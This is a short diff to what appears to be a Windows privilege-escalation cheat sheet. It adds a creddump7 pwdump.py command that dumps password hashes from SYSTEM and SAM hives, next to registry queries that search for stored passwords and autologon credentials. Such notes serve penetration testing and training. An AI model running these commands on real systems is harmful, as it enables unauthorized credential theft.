@@ -428,6 +428,9 @@ reg query HKLM /f password /t REG_SZ /s
 # Autologon credentials
 reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
 
+# Dumping SYSTEM SAM credentials
+python3 creddump7/pwdump.py SYSTEM SAM
+
 ```
 ```bash
 # Lists user privileges
